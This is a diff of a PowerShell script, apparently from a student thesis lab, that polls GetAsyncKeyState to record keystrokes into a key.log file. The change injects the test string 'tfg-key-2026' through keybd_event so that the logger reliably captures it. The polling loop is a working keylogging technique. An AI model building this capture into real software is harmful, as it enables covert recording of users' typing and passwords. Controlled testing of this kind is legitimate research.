@@ -12,14 +12,33 @@ public class K {
     public static extern short GetAsyncKeyState(int vKey);
 }
 '@
-Add-Type -AssemblyName System.Windows.Forms
 $t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
 $log = Join-Path $ev 'key.log'
 $end = (Get-Date).AddSeconds(20)
 $keys = @(0x30..0x5A) + 0xBD
 $prev = @{}
 $seq = New-Object System.Collections.Generic.List[string]
-$job = Start-Job { Start-Sleep -Seconds 2; Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('tfg-key-2026') }
+# Inyeccion con keybd_event: mantiene cada tecla pulsada 150 ms para que el
+# sondeo GetAsyncKeyState la observe con seguridad (SendKeys era demasiado rapido).
+$job = Start-Job {
+    Start-Sleep -Seconds 2
+    Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+public class KB {
+    [DllImport("user32.dll")]
+    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+}
+'@
+    $vkmap = @{ 't'=0x54; 'f'=0x46; 'g'=0x47; '-'=0xBD; 'k'=0x4B; 'e'=0x45; 'y'=0x59; '2'=0x32; '0'=0x30; '6'=0x36 }
+    foreach ($ch in 'tfg-key-2026'.ToCharArray()) {
+        $vk = [byte]$vkmap[[string]$ch]
+        [KB]::keybd_event($vk, 0, 0, [UIntPtr]::Zero)
+        Start-Sleep -Milliseconds 150
+        [KB]::keybd_event($vk, 0, 2, [UIntPtr]::Zero)
+        Start-Sleep -Milliseconds 150
+    }
+}
 while ((Get-Date) -lt $end) {
     foreach ($vk in $keys) {
         $down = (([K]::GetAsyncKeyState($vk) -band 0x8000) -ne 0)
